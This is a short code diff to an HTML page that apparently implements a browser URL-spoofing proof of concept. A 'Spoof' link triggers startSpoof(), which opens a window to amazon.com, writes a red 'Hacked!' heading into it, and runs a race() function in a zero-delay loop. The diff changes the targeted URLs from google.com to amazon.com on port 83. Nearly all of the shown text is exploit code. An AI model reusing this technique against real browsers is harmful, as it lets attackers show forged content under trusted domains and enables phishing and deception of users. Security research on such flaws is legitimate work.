@@ -3,7 +3,7 @@
 </head>
 
 <body>
-    <a href="javascript:window.open('http://amazon.com:83','x');" onclick="startSpoof()">Spoof</a>
+    <a href="javascript:window.open('https://amazon.com:83','x');" onclick="startSpoof()">Spoof</a>
 </body>
     
     <script>
@@ -21,7 +21,7 @@
     
     function startSpoof() {
 
-      windowSpoof = window.open("http://google.com","x");
+      windowSpoof = window.open("http://amazon.com:83","x");
       windowSpoof.document.write('<h1 style="color:red">Hacked!<h1>');
 
       setInterval('race()', 0);
